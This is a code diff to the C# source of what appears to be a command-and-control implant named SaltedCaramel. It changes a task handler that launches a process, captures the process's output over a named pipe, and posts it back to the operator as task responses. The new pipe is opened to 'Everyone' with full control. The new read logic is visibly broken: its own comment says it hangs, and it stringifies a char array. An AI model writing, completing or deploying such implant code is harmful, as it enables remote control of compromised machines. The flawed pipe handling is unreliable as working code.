@@ -1,4 +1,5 @@
-﻿using Newtonsoft.Json;
+﻿using Microsoft.Win32.SafeHandles;
+using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -6,6 +7,7 @@ using System.IO;
 using System.IO.Pipes;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Security.AccessControl;
 using System.Text;
 using System.Threading;
 
@@ -77,10 +79,20 @@ namespace SaltedCaramel
             STARTUPINFO startupInfo = new STARTUPINFO();
             string directory = "C:\\Temp";
 
+            byte[] random = new byte[2];
+            Random rnd = new Random();
+            rnd.NextBytes(random);
+            string pipeName = "Caramel_" + BitConverter.ToString(random);
+
+            PipeSecurity sec = new PipeSecurity();
+            sec.SetAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
+
+            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, sec);
+
+            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", pipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
+
             try
             {
-                NamedPipeServerStream pipeServer = new NamedPipeServerStream("CaramelPipe", PipeDirection.InOut);
-                NamedPipeClientStream pipeClient = new NamedPipeClientStream("CaramelPipe");
                 pipeClient.Connect();
                 pipeServer.WaitForConnection();
 
@@ -105,22 +117,19 @@ namespace SaltedCaramel
                     Debug.WriteLine("Got process handle!");
 
                     // Trying to continuously read output while the process is running.
-                    IntPtr wait = (IntPtr)1;
-                    ThreadPool.QueueUserWorkItem((p) => wait = WaitForSingleObject(newProc.hProcess, (UInt32)1));
-                    while (wait != IntPtr.Zero)
+                    using (StreamReader reader = new StreamReader(pipeServer))
                     {
-                        using (StreamReader reader = new StreamReader(pipeServer))
+                        char[] buffer = new char[1024];
+                        // Hangs on reading data for some reason.
+                        reader.Read(buffer, 0, 1024);
+                        string message = buffer.ToString();
+                        if (message != null)
                         {
-                            string message = reader.ReadLine();
-                            if (message != null)
-                            {
-                                message += "\n";
-                                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(message), task.id);
-                                implant.PostResponse(response);
-                            }
+                            message += "\n";
+                            TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(message), task.id);
+                            implant.PostResponse(response);
                         }
                     }
-                    Debug.WriteLine(wait);
 
                     pipeClient.Close();
                     pipeServer.Close();
@@ -137,6 +146,8 @@ namespace SaltedCaramel
             }
             catch (Exception e)
             {
+                pipeClient.Close();
+                pipeServer.Close();
                 implant.SendError(task.id, "Error: " + e.Message);
             }
         }
